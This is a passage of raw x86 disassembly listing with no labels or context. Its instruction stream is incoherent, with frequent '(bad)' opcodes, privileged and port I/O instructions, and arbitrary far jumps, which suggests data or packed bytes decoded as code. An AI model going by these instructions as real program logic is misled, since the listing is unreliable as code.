  403a48:	mov    BYTE PTR [edx-0x14c5bf4c],0x91
  403a4f:	shl    BYTE PTR [ecx],cl
  403a51:	jmp    0x403ac1
  403a53:	mov    edx,0x8d0dce6b
  403a58:	int3   
  403a59:	push   edi
  403a5a:	stos   DWORD PTR es:[edi],eax
  403a5b:	jae    0x403a29
  403a5d:	xchg   ebx,eax
  403a5e:	test   BYTE PTR [edi],bh
  403a60:	stc    
  403a61:	in     eax,0x35
  403a63:	loopne 0x403a53
  403a65:	adc    al,0xd0
  403a67:	std    
  403a68:	add    BYTE PTR [edx],0xa
  403a6b:	mov    esp,0x3aa4ee02
  403a70:	sidtd  [edx+0x5f]
  403a74:	cmc    
  403a75:	mov    eax,0x83188552
  403a7a:	pop    edi
  403a7b:	jo     0x403a66
  403a7d:	iret   
  403a7e:	fcom   DWORD PTR [esi]
  403a80:	(bad)  
  403a81:	in     al,0xd0
  403a83:	sbb    DWORD PTR [edi-0x7044d507],eax
  403a89:	mov    edx,0x2da3ba1f
  403a8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a8f:	(bad)
  403a92:	rcr    DWORD PTR [edx+0x7659a7c0],1
  403a98:	xchg   edx,eax
  403a99:	push   edi
  403a9a:	clc    
  403a9b:	test   DWORD PTR [ebx-0x4478eeb2],edi
  403aa1:	pushf  
  403aa2:	mov    al,ds:0xa0803444
  403aa7:	repnz or al,0x2c
  403aaa:	xor    DWORD PTR [ecx+ebp*1],ebx
  403aad:	xchg   edx,eax
  403aae:	xchg   ebx,eax
  403aaf:	xor    esi,edx
  403ab1:	push   cs
  403ab2:	xchg   edx,eax
  403ab3:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ab5:	or     bl,BYTE PTR [edx+ecx*8+0x22cfc2d0]
  403abc:	push   esi
  403abd:	inc    ebp
  403abe:	test   edx,eax
  403ac0:	pop    ss
  403ac1:	mov    edx,0xf2f57613
  403ac6:	ss aad 0x84
  403ac9:	mov    edx,0xd3dfc486
  403ace:	mov    dh,0x71
  403ad0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ad1:	add    ch,BYTE PTR [ebx+eiz*4-0x46]
  403ad5:	jmp    0xad7:0x344b6c6f
  403adc:	xchg   DWORD PTR [edx-0x41],ebx
  403adf:	add    bh,ch
  403ae1:	cdq    
  403ae2:	mov    edi,DWORD PTR [ebx-0x32]
  403ae5:	ret    
  403ae6:	and    BYTE PTR [esi],bl
  403ae8:	sub    BYTE PTR [edi+0x29ddd255],0x37
  403aef:	pop    ds
  403af0:	mov    edx,0x31e94140
  403af5:	mov    dl,0x6c
  403af7:	aad    0xf5
  403af9:	call   0x83a6:0x6950dc71
  403b00:	jge    0x403b33
  403b02:	add    edx,DWORD PTR [esi]
  403b04:	shl    BYTE PTR [ebp-0x7ae28599],cl
  403b0a:	fs repnz inc ebx
  403b0d:	(bad)  
  403b0e:	mov    eax,0x55e97d9f
  403b13:	and    BYTE PTR [ebp+0x15],dh
  403b16:	push   edx
  403b17:	cmp    eax,0x2de9b422
  403b1c:	ret    0x9bd8
  403b1f:	pop    edi
  403b20:	xchg   esi,eax
  403b21:	xor    BYTE PTR ds:0x92a7ef22,dh
  403b27:	ds jge 0x403ae2
  403b2a:	clc    
  403b2b:	sub    edi,DWORD PTR [edi+0x25]
  403b2e:	sub    BYTE PTR [eax-0x1c2cc9e1],bh
  403b34:	ins    BYTE PTR es:[edi],dx
  403b35:	retf   0x97b8
  403b38:	jb     0x403ad5
  403b3a:	call   0x9d840c68
  403b3f:	outs   dx,BYTE PTR ds:[esi]
  403b40:	mov    esp,0x70421fd1
  403b45:	push   0xf
  403b47:	adc    al,0x87
  403b49:	push   edx
  403b4a:	lods   al,BYTE PTR ds:[esi]
  403b4b:	ficomp WORD PTR [esi]
  403b4d:	aam    0x89
  403b4f:	rcl    edi,0x2a
  403b52:	adc    al,0xf8
  403b54:	(bad)  
  403b56:	sub    edi,DWORD PTR [edx-0x40]
  403b59:	pop    ss
  403b5a:	mov    al,ds:0x39fe3e94
  403b5f:	repz ror DWORD PTR [ecx+0x5dcd0357],0x33
  403b67:	sbb    cl,BYTE PTR [ebp-0x49]
  403b6a:	and    al,0x86
  403b6c:	test   eax,0xf8869b17
  403b71:	sahf   
  403b72:	mov    ah,0x4a
  403b74:	lods   al,BYTE PTR ds:[esi]
  403b75:	xor    cl,cl
  403b77:	out    dx,al
  403b78:	daa    
  403b79:	out    dx,al
  403b7a:	fwait
  403b7b:	bound  ebp,QWORD PTR [ecx]
  403b7d:	aad    0xb9
  403b7f:	hlt    
  403b80:	pop    ss
  403b81:	pushf  
  403b82:	rdmsr  
  403b84:	lock stos DWORD PTR es:[edi],eax
  403b86:	fldenv [ebx+0x9]
  403b89:	out    dx,eax
  403b8a:	gs xchg edi,eax
  403b8c:	inc    edi
  403b8d:	mov    ebx,0xbd94b1e7
  403b92:	add    DWORD PTR [eax-0x7283785c],ebx
  403b98:	pop    edi
  403b99:	or     eax,0x2c35d1ac
  403b9e:	sbb    dl,bl
  403ba0:	je     0x403b44
  403ba2:	sahf   
  403ba3:	pop    ss
  403ba4:	jns    0x403b91
  403ba6:	shr    DWORD PTR [edi-0x20],0x66
  403baa:	out    dx,al
  403bab:	aas    
  403bac:	popf   
  403bad:	cmp    DWORD PTR ds:0x1ee9e6e7,ebp
  403bb3:	adc    al,0xad
  403bb5:	(bad)  
  403bb6:	dec    eax
  403bb7:	sar    BYTE PTR [ecx+eax*4],cl
  403bba:	ja     0x403b80
  403bbc:	outs   dx,DWORD PTR ds:[esi]
  403bbd:	inc    eax
  403bbe:	pop    ebp
  403bbf:	aaa    
  403bc0:	cmp    esi,ecx
  403bc2:	inc    esp
  403bc3:	fwait
  403bc4:	and    dl,BYTE PTR [edx-0x75bf9961]
  403bca:	sbb    BYTE PTR [edx-0x37],ch
  403bcd:	mov    BYTE PTR [esp+eiz*2-0x188135ba],dl
  403bd4:	mov    edx,0xb1025d16
  403bd9:	test   BYTE PTR [ecx],bh
  403bdb:	xor    eax,0x65e63ede
  403be0:	stos   DWORD PTR es:[edi],eax
  403be1:	dec    ecx
  403be2:	fld    QWORD PTR [ebx-0x13]
  403be5:	push   eax
  403be6:	sti    
  403be7:	push   ebx
  403be8:	stos   DWORD PTR es:[edi],eax
  403be9:	rcr    BYTE PTR [edi+0x38],1
  403bec:	mov    ebp,0xdb42d770
  403bf1:	pop    edx
  403bf2:	push   ss
  403bf3:	mov    WORD PTR [ebx-0x6b],es
  403bf6:	sub    eax,DWORD PTR [edx-0x30]
  403bf9:	fistp  DWORD PTR [ecx+0x49]
  403bfc:	pop    eax
  403bfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bfe:	mov    al,BYTE PTR [esp+eiz*4-0x4c]
  403c02:	add    esi,DWORD PTR [edx+esi*4-0xd]
  403c06:	xchg   ebx,eax
  403c07:	pop    ebx
  403c08:	ja     0x403c44
  403c0a:	out    0x27,eax
  403c0c:	in     al,0x89
  403c0e:	push   ebp
  403c0f:	hlt    
  403c10:	and    DWORD PTR [edi],0x47
  403c13:	test   esp,ebp
  403c15:	adc    cl,BYTE PTR [ebx]
  403c17:	dec    ebx
  403c18:	outs   dx,DWORD PTR ds:[esi]
  403c19:	test   DWORD PTR [eax-0x7b],eax
  403c1c:	cmp    bl,BYTE PTR [ecx-0x608e3f7d]
  403c22:	dec    eax
  403c23:	popf   
  403c24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c25:	jge    0x403bd6
  403c27:	sub    eax,0x1961c26b
  403c2c:	(bad)  
  403c2d:	in     al,dx
  403c2e:	mov    al,0x85
  403c30:	nop
  403c31:	inc    edx
  403c32:	adc    eax,0xf9b143b
  403c37:	leave  
  403c38:	jp     0x403c40
  403c3a:	inc    eax
  403c3b:	mov    fs,ebp
  403c3d:	mov    BYTE PTR [esi],dl
  403c3f:	push   ebp
  403c40:	push   ecx
  403c41:	cmp    eax,0x11008833
  403c46:	sub    al,0xd3
  403c48:	(bad)  
  403c4a:	inc    eax
  403c4b:	jae    0x403c39
  403c4d:	and    esp,DWORD PTR [ebp+ebp*2-0x44]
  403c51:	jmp    0xc9d908b
  403c56:	dec    esp
  403c57:	and    dh,cl
  403c59:	test   BYTE PTR [ebp-0x66],bl
  403c5c:	aas    
  403c5d:	nop
  403c5e:	jl     0x403bfa
  403c60:	data16 cmp bl,dh
  403c63:	ret    0xbb12
  403c66:	mov    ch,0xa2
  403c68:	rcr    DWORD PTR ds:0xf584aa2a,cl
  403c6e:	sahf   
  403c6f:	std    
  403c70:	aad    0x95
  403c72:	cld    
  403c73:	pop    ebp
  403c74:	bound  esi,QWORD PTR [ebx-0x5e]
  403c77:	mov    al,ds:0x22fd22f2
  403c7c:	push   esp
  403c7d:	dec    ecx
  403c7e:	add    al,0xcb
  403c80:	push   ecx
  403c81:	jecxz  0x403ccc
  403c83:	fcomp  QWORD PTR [edx+0x3]
  403c86:	popf   
  403c87:	xchg   DWORD PTR [eax+0x33],esp
  403c8a:	scas   al,BYTE PTR es:[edi]
  403c8b:	hlt    
  403c8c:	inc    esi
  403c8d:	add    DWORD PTR [ebx+edx*4],esi
  403c90:	pop    ebp
  403c91:	out    0x59,al
  403c93:	xchg   esp,eax
  403c94:	jmp    0x3343:0xfde7ba66
  403c9b:	dec    ebx
  403c9c:	adc    ah,BYTE PTR [ecx+0x4]
  403c9f:	imul   ebp,DWORD PTR [esi*8+0x1a27163f],0xffffff97
  403ca7:	in     al,dx
  403ca8:	clc    
  403ca9:	lock ins DWORD PTR es:[edi],dx
  403cab:	mov    edx,0x11c4489a
  403cb0:	adc    esi,esp
  403cb2:	push   ds
  403cb3:	dec    edi
  403cb4:	iret   
  403cb5:	nop
  403cb6:	stc    
  403cb7:	das    
  403cb8:	les    ebx,FWORD PTR [ebx]
  403cba:	mov    ecx,0xcc2a452d
  403cbf:	or     eax,0xffffffde
  403cc2:	mov    bh,0x33
  403cc4:	clc    
  403cc5:	dec    ebp
  403cc6:	inc    ebp
  403cc7:	or     ebx,DWORD PTR [ebp-0x62]
  403cca:	mov    ecx,0x9fc78eae
  403ccf:	les    esi,FWORD PTR [esi-0x18946e52]
  403cd5:	inc    ecx
  403cd6:	xlat   BYTE PTR ds:[ebx]
  403cd7:	in     eax,dx
  403cd8:	fidivr DWORD PTR [ebx+0x36]
  403cdb:	ds jecxz 0x403d49
  403cde:	push   edx
  403cdf:	stos   BYTE PTR es:[edi],al
  403ce0:	test   al,0x4c
  403ce2:	jns    0x403d56
  403ce4:	inc    esp
  403ce5:	inc    esp
  403ce6:	fstp   DWORD PTR [bx-0x4f9b]
  403ceb:	or     ebx,edi
  403ced:	jns    0x403cfe
  403cef:	bound  ebx,QWORD PTR [edx-0x4f]
  403cf2:	arpl   dx,di
  403cf4:	jno    0x403c82
  403cf6:	xlat   BYTE PTR ds:[ebx]
  403cf7:	and    BYTE PTR [ecx+0x2],ch
  403cfa:	push   ebx
  403cfb:	or     al,0xb2
  403cfd:	and    BYTE PTR [ebx+ebp*2-0x10],dl
  403d01:	test   DWORD PTR [ebx+0xf2ed6a2],0x30fd8ff6
  403d0b:	push   0xffffffad
  403d0d:	inc    ecx
  403d0e:	and    ah,BYTE PTR [eax-0x5e]
  403d11:	in     al,dx
  403d12:	pop    eax
  403d13:	sub    BYTE PTR [eax+0x7bb1ad14],al
  403d19:	jo     0x403ccf
  403d1b:	and    al,BYTE PTR [edx+0x7c]
  403d1e:	cmp    ah,cl
  403d20:	push   ss
  403d21:	mov    bl,0x56
  403d23:	adc    DWORD PTR [eax-0x4],eax
  403d26:	jp     0x403d74
  403d28:	retf   0x6657
  403d2b:	jl     0x403d1e
  403d2d:	loop   0x403ce7
  403d2f:	jo     0x403d04
  403d31:	test   DWORD PTR es:[edi+0x1b],esi
  403d35:	fadd   st(6),st
  403d37:	iret   
  403d38:	fmul   QWORD PTR [edi-0x11cbc88e]
  403d3e:	in     eax,0x7e
  403d40:	sbb    DWORD PTR [edi+0x25],edi
  403d43:	push   ds
  403d44:	or     bh,BYTE PTR [eax]
  403d46:	adc    BYTE PTR [edx],ah
  403d48:	lea    esi,[ebx+0x613a7e38]
  403d4e:	mov    edx,edi
  403d50:	lods   eax,DWORD PTR ds:[esi]
  403d51:	or     BYTE PTR [edx-0x3f],dl
  403d54:	jae    0x403dc0
  403d56:	jp     0x403dcf
  403d58:	or     al,0x1a
  403d5a:	loope  0x403d5a
  403d5c:	cmp    BYTE PTR [esi],bl
  403d5e:	aad    0xa9
  403d60:	outs   dx,BYTE PTR ds:[esi]
  403d61:	add    eax,0x7697df9f
  403d66:	xchg   edx,eax
  403d67:	mov    eax,fs:0x4d0423c4
  403d6d:	mov    dl,0xb
  403d6f:	jl     0x403d55
  403d71:	dec    edx
  403d72:	icebp  
  403d73:	dec    eax
  403d74:	daa    
  403d75:	leave  
  403d76:	in     al,0x8d
  403d78:	shl    BYTE PTR [eax+edi*1+0x2d0b255b],cl
  403d7f:	stos   BYTE PTR es:[edi],al
  403d80:	popa   
  403d81:	jae    0x403d63
  403d83:	ins    BYTE PTR es:[edi],dx
  403d84:	dec    edx
  403d85:	adc    esi,0xffffff91
  403d88:	pop    ebx
  403d89:	sub    al,0x1b
  403d8c:	clc    
  403d8d:	mov    ah,0x7f
  403d8f:	or     dh,dl
  403d91:	pop    esi
  403d92:	mov    esi,0x3b88ea3
  403d97:	or     DWORD PTR [edx],ebx
  403d99:	retf   
  403d9a:	sub    ebx,DWORD PTR [ecx+0x1e]
  403d9d:	push   ebx
  403d9e:	adc    edx,DWORD PTR [esi]
  403da0:	into   
  403da1:	iret   
  403da2:	jbe    0x403e0d
  403da4:	dec    ebx
  403da5:	cmp    al,0xd2
  403da7:	out    dx,al
  403da8:	sahf   
  403da9:	aam    0x8d
  403dab:	xchg   edx,eax
  403dac:	and    eax,0x6c5597ba
  403db1:	(bad)
  403db4:	std    
  403db5:	cwde   
  403db6:	mov    WORD PTR [esi],?
  403db8:	mov    al,ds:0xa29840cf
  403dbd:	sbb    DWORD PTR [edx+0x57],edx
  403dc0:	cmp    bh,bh
  403dc2:	ficomp WORD PTR [edi]
  403dc4:	(bad)  
  403dc5:	lock std 
  403dc7:	fbld   TBYTE PTR [ebx-0x1cba9172]
  403dcd:	std    
  403dce:	pop    ds
  403dcf:	pop    ecx
  403dd0:	xchg   ecx,eax
  403dd1:	ret    
  403dd2:	out    dx,al
  403dd3:	dec    ecx
  403dd4:	mov    ds:0x96bf8940,eax
  403dd9:	and    DWORD PTR [ebx+0x48],ebp
  403ddc:	cdq    
  403ddd:	add    al,dh
  403ddf:	and    eax,0xd0387f33
  403de4:	jno    0x403def
  403de6:	lock push ds
  403de8:	jmp    0x42bc:0xd09e2c4
  403def:	(bad)  
  403df0:	sub    eax,0x6f5fbbf1
  403df5:	(bad)  [eax+0x69487267]
  403dfb:	dec    ebx
  403dfc:	and    al,0x17
  403dfe:	daa    
  403dff:	in     al,dx
  403e00:	mov    bh,0x7d
  403e02:	pop    esp
  403e03:	jge    0x403dd9
  403e05:	mov    bh,0x8f
  403e07:	or     al,0xcb
  403e09:	cmp    BYTE PTR [ecx-0x4e],0x79
  403e0d:	repz mov ch,0x82
  403e10:	push   ebx
  403e11:	lahf   
  403e12:	ja     0x403de6
  403e14:	xchg   edx,eax
  403e15:	rcr    BYTE PTR ds:0x7af478c9,1
  403e1b:	in     al,dx
  403e1c:	inc    ebx
  403e1d:	xchg   esi,eax
  403e1e:	mov    ecx,0x7394e516
  403e23:	and    eax,eax
  403e25:	mov    eax,ds:0x7800f734
  403e2a:	cdq    
  403e2b:	jle    0x403de6
  403e2d:	adc    cl,dh
  403e2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e30:	xor    al,0x37
  403e32:	shr    BYTE PTR [ebx-0x2c41fbdc],0x6d
  403e39:	shl    DWORD PTR [esi-0x5],cl
  403e3c:	jmp    0x403e1f
  403e3e:	jnp    0x403e1f
  403e40:	mov    ch,BYTE PTR [ecx+0x3d]
  403e43:	jmp    0x4edda047
  403e48:	xchg   edi,esi
  403e4a:	mov    cl,0xf4
  403e4c:	cmp    al,0x15
  403e4e:	add    al,0x5a
  403e50:	scas   al,BYTE PTR es:[edi]
  403e51:	shr    BYTE PTR [ebp+0x3f],1
  403e54:	jb     0x403e5d
  403e56:	call   0xa931a4ec
  403e5b:	scas   eax,DWORD PTR es:[edi]
  403e5c:	fxam   
  403e5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e60:	lea    esp,[ebx+0x19fdb51b]
  403e66:	xor    ah,BYTE PTR [esi-0x5b]
  403e69:	dec    esp
  403e6a:	inc    esi
  403e6b:	push   esp
  403e6c:	out    dx,al
  403e6d:	cmp    ebx,DWORD PTR [eax+0x3e]
  403e70:	cmp    DWORD PTR [ebx+edi*2],0xffffffdd
  403e74:	jo     0x403e7e
  403e76:	sub    ebx,DWORD PTR [esi]
  403e78:	sbb    bh,BYTE PTR [ebx+0x4fe293f7]
  403e7e:	nop
  403e7f:	cdq    
  403e80:	push   eax
  403e81:	dec    ecx
  403e82:	fimul  DWORD PTR [edi-0x4c0d3fe9]
  403e88:	mov    esi,ebp
  403e8a:	call   0x8866843f
  403e8f:	js     0x403e82
  403e91:	lahf   
  403e92:	cli    
  403e93:	das    
  403e94:	sbb    ecx,DWORD PTR [edi]
  403e96:	fstp   DWORD PTR [ecx]
  403e98:	stc    
  403e99:	iret   
  403e9a:	loope  0x403ef4
  403e9c:	inc    edx
  403e9d:	xor    edi,esp
  403e9f:	jmp    0x40ea376d
  403ea4:	ret    0xb319
  403ea7:	mov    edi,0x3ea34603
  403eac:	push   ss
  403ead:	mov    edi,0x120e7ef4
  403eb2:	add    al,0x5e
  403eb4:	dec    ecx
  403eb5:	sub    al,0x35
  403eb7:	(bad)  
  403eb8:	cld    
  403eb9:	jle    0x403ed4
  403ebb:	xor    al,0x86
  403ebd:	cld    
  403ebe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ebf:	jle    0x403e63
  403ec1:	push   cs
  403ec2:	add    al,0x16
  403ec4:	loope  0x403e48
  403ec6:	out    dx,eax
  403ec7:	jo     0x403e61
  403ec9:	mov    al,0x6f
  403ecb:	jl     0x403ee1
  403ecd:	cmp    al,0x2e
  403ecf:	pop    edx
  403ed0:	repnz lock rcl BYTE PTR [edi+0x22],0x50
  403ed6:	dec    ebx
  403ed7:	int3   
  403ed8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ed9:	fwait
  403eda:	call   0x207fe294
  403edf:	jnp    0x403e8b
  403ee1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ee2:	mov    cl,0xb6
  403ee4:	mov    bh,0xf0
  403ee6:	or     edi,DWORD PTR [esi-0x2ea5aeb0]
  403eec:	or     al,0x82
  403eee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403eef:	push   ebp
  403ef0:	movzx  esp,BYTE PTR [ebx-0x47]
  403ef4:	loope  0x403f40
  403ef6:	add    ebx,DWORD PTR [ebx]
  403ef8:	data16 ja 0x403f4c
  403efb:	inc    ebx
  403efc:	(bad)  [edi]
  403efe:	sub    al,0xe1
  403f00:	fmul   QWORD PTR [edx-0x2]
  403f03:	scas   al,BYTE PTR es:[edi]
  403f04:	call   0x59c2:0xb83323f5
  403f0b:	pop    ecx
  403f0c:	sub    al,0x5a
  403f0e:	adc    ch,0x84
  403f11:	pop    ebx
  403f12:	add    eax,0xd01268cd
  403f17:	jge    0x403f7b
  403f19:	push   ebx
  403f1a:	inc    edx
  403f1b:	mov    ebx,0x73cd0e17
  403f20:	stc    
  403f21:	paddsb mm0,QWORD PTR ds:0xe0eb798e
  403f28:	lahf   
  403f29:	mov    edx,0xa752464d
  403f2e:	sub    BYTE PTR [edi-0x75],cl
  403f31:	pop    esi
  403f32:	mov    ch,0x11
  403f34:	and    DWORD PTR ds:0x9376e48,0x63a65670
  403f3e:	push   cs
  403f3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f40:	mov    DWORD PTR [eax+0xc5f5d69],0x57665ea3
  403f4a:	dec    ebp
  403f4b:	aad    0x27
  403f4d:	in     eax,dx
  403f4e:	jmp    0x403f89
  403f50:	sub    ax,0xac1c
  403f54:	jae    0x403f02
  403f56:	pop    esi
  403f57:	jle    0x403ef8
  403f59:	rep lods al,BYTE PTR ds:[esi]
  403f5b:	add    al,0xbc
  403f5d:	or     edi,DWORD PTR [ebx]
  403f5f:	(bad)  [edi+0x3e323be8]
  403f65:	sahf   
  403f66:	stos   DWORD PTR es:[edi],eax
  403f67:	lock and eax,0xdadf3a5
  403f6d:	push   esp
  403f6e:	in     eax,0xde
  403f70:	push   ecx
  403f71:	in     eax,dx
  403f72:	sub    DWORD PTR [esi+eiz*2-0x1b],ecx
  403f76:	repnz mov bh,0x4c
  403f79:	adc    al,0xff
  403f7b:	lahf   
  403f7c:	add    eax,0x6f5b048a
  403f81:	je     0x403f25
  403f83:	neg    BYTE PTR [ebp-0x117deafc]
  403f89:	bound  edi,QWORD PTR [esi]
  403f8b:	and    ch,bl
  403f8d:	je     0x403fd1
  403f8f:	sti    
  403f90:	dec    ebp
  403f91:	adc    edx,DWORD PTR [eax+0x63d5c2ed]
  403f97:	bound  esi,QWORD PTR [ecx-0x31]
  403f9a:	clc    
  403f9b:	mov    eax,ds:0x187360db
  403fa0:	out    0x5a,al
  403fa2:	ja     0x403fc3
  403fa4:	sbb    dl,BYTE PTR [edi]
  403fa6:	jb     0x403f86
  403fa8:	jmp    0x344a:0x8cb1c596
  403faf:	xchg   edx,eax
  403fb0:	mov    ah,0xec
  403fb2:	in     al,dx
  403fb3:	or     dl,ch
  403fb5:	test   eax,0xa99eaa2e
  403fba:	dec    edi
  403fbb:	test   al,0x46
  403fbd:	loop   0x403fab
  403fbf:	cld    
  403fc0:	jmp    0xe277ec74
  403fc5:	or     esi,DWORD PTR [ebx+0x2f5cd806]
  403fcb:	mov    edx,0xc5a9e2fa
  403fd0:	popa   
  403fd1:	add    DWORD PTR ds:0xd5b7d82e,ecx
  403fd7:	adc    BYTE PTR [esi-0x2b],dh
  403fda:	cdq    
  403fdb:	aad    0x66
  403fdd:	aad    0x25
  403fdf:	cdq    
  403fe0:	fidiv  DWORD PTR [ecx-0x18205624]
  403fe6:	(bad)  
  403fe8:	inc    esi
  403fe9:	cmp    al,0x0
  403feb:	push   eax
  403fec:	out    0xa4,al
  403fee:	inc    BYTE PTR [eax]
  403ff0:	and    dl,BYTE PTR [edx-0x40]
  403ff3:	jno    0x40405e
  403ff5:	jns    0x40400f
  403ff7:	out    0x77,eax
  403ff9:	sub    ch,BYTE PTR [ecx-0x2bc6301]
  403fff:	out    dx,al
  404000:	test   al,0xae
  404002:	sti    
  404003:	push   eax
  404004:	jbe    0x40406c
  404006:	or     BYTE PTR [ecx],dl
  404008:	mov    BYTE PTR [esi-0x132070c8],ch
  40400e:	sar    DWORD PTR [ecx],0xe2
  404011:	cmp    edx,DWORD PTR [eax-0x5f]
  404014:	pop    es
  404015:	jno    0x404077
  404017:	in     eax,0xac
  404019:	sub    DWORD PTR [eax],ebp
  40401b:	and    bl,BYTE PTR [eax]
  40401d:	xor    eax,0x92c65a12
  404022:	xor    DWORD PTR [edi+ecx*8-0x22],edx
  404026:	mul    BYTE PTR [edx-0x18dbbc14]
  40402c:	call   0x86ae:0xe13fae72
  404033:	jne    0x404050
  404035:	cli    
  404036:	xchg   esp,eax
  404037:	adc    esi,0x4be5d893
  40403d:	dec    ecx
  40403e:	test   bh,ch
  404040:	mov    eax,ds:0xcaa84712
  404045:	push   ss
  404046:	pop    ecx
  404047:	fidiv  DWORD PTR [edx-0x36d56355]
  40404d:	(bad)  
  40404e:	xlat   BYTE PTR ds:[ebx]
  40404f:	mov    ah,0xa0
  404051:	bnd jne 0x404055
  404054:	mov    bh,0x49
  404056:	cmc    
  404057:	jecxz  0x404038
  404059:	mov    al,0x6c
  40405b:	scas   al,BYTE PTR es:[edi]
  40405c:	inc    ebx
  40405d:	and    esp,eax
  40405f:	dec    esp
  404060:	in     al,dx
  404061:	mov    al,BYTE PTR [ecx]
  404063:	(bad)  
  404064:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404065:	push   ebp
  404066:	hlt    
  404067:	xor    dh,al
  404069:	cmp    dh,BYTE PTR ds:0xdb7bfee9
  40406f:	jp     0x404083
  404071:	dec    esp
  404072:	rcl    DWORD PTR [edi+edx*1],cl
  404075:	cmp    ch,bl
  404077:	test   ecx,ebp
  404079:	fcomp  QWORD PTR [edi]
  40407b:	test   DWORD PTR [edx+0x7ee8fa5b],0x4146bb1d
  404085:	ret    0x6651
  404088:	push   ds
  404089:	repz xor al,0x98
  40408c:	and    cl,BYTE PTR [esi]
  40408e:	adc    ecx,0xffffff81
  404091:	aad    0x33
  404093:	dec    ebp
  404094:	adc    DWORD PTR [esi+0x7c],esi
  404097:	cld    
  404098:	sbb    bh,BYTE PTR [ebx]
  40409a:	popa   
  40409b:	xchg   ebx,eax
  40409c:	push   ss
  40409d:	pop    eax
  40409e:	inc    eax
  40409f:	inc    ebx
  4040a0:	fcomp  QWORD PTR [eax+0x5ec4511d]
  4040a6:	xchg   ecx,eax
  4040a7:	pop    ecx
  4040a8:	ss mov eax,0xe8bc9e68
  4040ae:	fstp   TBYTE PTR [ecx+ebp*8+0x63895402]
  4040b5:	rol    BYTE PTR [edx],cl
  4040b7:	sbb    eax,0xc480e713
  4040bc:	pop    esp
  4040bd:	or     BYTE PTR [ecx-0x31],cl
  4040c0:	outs   dx,DWORD PTR ds:[esi]
  4040c1:	sub    DWORD PTR [edi],esp
  4040c3:	sti    
  4040c4:	pop    edx
  4040c5:	pop    ds
  4040c6:	dec    esp
  4040c7:	popa   
  4040c8:	adc    BYTE PTR ds:0x5cbb7526,bh
  4040ce:	cmp    BYTE PTR [ecx+0x68],bl
  4040d1:	cli    
  4040d2:	fild   QWORD PTR [ebx+0x7f70e848]
  4040d8:	out    dx,eax
  4040d9:	jns    0x404100
  4040db:	add    BYTE PTR [ebx-0x1def2fc4],cl
  4040e1:	xor    esp,DWORD PTR [esi]
  4040e3:	mov    WORD PTR [ebx+0x48],es
  4040e6:	ins    BYTE PTR es:[edi],dx
  4040e7:	out    dx,eax
  4040e8:	mov    cl,0x3a
  4040ea:	in     eax,0xfb
  4040ec:	inc    ecx
  4040ed:	sbb    al,BYTE PTR [ebx]
  4040ef:	jbe    0x404128
  4040f1:	xchg   ebx,eax
  4040f2:	xor    esp,edi
  4040f4:	fnsave [ecx]
  4040f6:	mov    ss,WORD PTR [ecx]
  4040f8:	vpunpckhbw ymm7,ymm3,YMMWORD PTR [eax]
  4040fc:	sbb    ah,BYTE PTR [edx-0x7d]
  4040ff:	pop    ds
  404100:	add    DWORD PTR [esi],ebx
  404102:	fwait
  404103:	ror    BYTE PTR [esi+0x5a019e0c],cl
  404109:	js     0x4040ee
  40410b:	(bad)  
  40410c:	inc    al
  40410e:	aam    0xc9
  404110:	int3   
  404111:	or     dh,BYTE PTR gs:[edx]
  404114:	cmc    
  404115:	and    DWORD PTR ds:0xc4cfb5bc,ebp
  40411b:	scas   eax,DWORD PTR es:[edi]
  40411c:	mov    bl,0xf1
  40411e:	lods   eax,DWORD PTR ds:[esi]
  40411f:	mov    fs,ebp
  404121:	or     bh,BYTE PTR [esp+ecx*1-0x115cb701]
  404128:	dec    edx
  404129:	push   eax
  40412a:	sbb    al,0x1
  40412c:	out    0x6f,eax
  40412e:	mov    al,0xa3
  404130:	cmp    DWORD PTR [edx-0x2c],0x3e8b7543
  404137:	xor    DWORD PTR [eax-0x70],esp
  40413a:	cdq    
  40413b:	popf   
  40413c:	jbe    0x404148
  40413e:	dec    esp
  40413f:	les    edx,FWORD PTR [ecx]
  404141:	xor    DWORD PTR [ebp-0x1cbfbc39],esi
  404147:	add    edx,DWORD PTR [esi]
  404149:	clc    
  40414a:	push   ebp
  40414b:	mov    edx,0x6c6f3c5c
  404150:	out    dx,eax
  404151:	jbe    0x404155
  404153:	into   
  404154:	out    dx,al
  404155:	clc    
  404156:	cmp    ebp,DWORD PTR [edi-0x4]
  404159:	inc    ebp
  40415a:	test   al,0xb8
  40415c:	xlat   BYTE PTR ds:[ebx]
  40415d:	cmc    
  40415e:	mov    bh,0xe8
  404160:	mov    WORD PTR ss:[esi-0x76],cs
  404164:	(bad)  
  404165:	fistp  WORD PTR [edi+0x20]
  404168:	ins    DWORD PTR es:[edi],dx
  404169:	xor    dh,BYTE PTR [edi]
  40416b:	pop    esi
  40416c:	push   ebx
  40416d:	push   ds
  40416e:	pusha  
  40416f:	fidiv  WORD PTR [esi+ebp*2+0x7608420e]
  404176:	enter  0x19f9,0xf3
  40417a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40417b:	in     eax,0xf0
  40417d:	cwde   
  40417e:	mov    BYTE PTR ds:0x1085ff71,0x90
  404185:	jne    0x40419d
  404187:	push   esi
  404188:	dec    esi
  404189:	pop    eax
  40418a:	(bad)  
  40418b:	fnstsw WORD PTR [ecx]
  40418d:	or     eax,0x395d392b
  404192:	stos   DWORD PTR es:[edi],eax
  404193:	mov    esi,0x556ea632
  404198:	sub    eax,edx
  40419a:	add    eax,0xb7d464bc
  40419f:	push   esp
  4041a0:	add    BYTE PTR [ebx],ch
  4041a2:	hlt    
  4041a3:	lds    edi,FWORD PTR [esi+0x3d443e3e]
  4041a9:	xchg   DWORD PTR [esi],edx
  4041ab:	mov    ecx,0x6619cc0f
  4041b0:	dec    esp
  4041b1:	adc    al,0x1f
  4041b3:	in     al,0xca
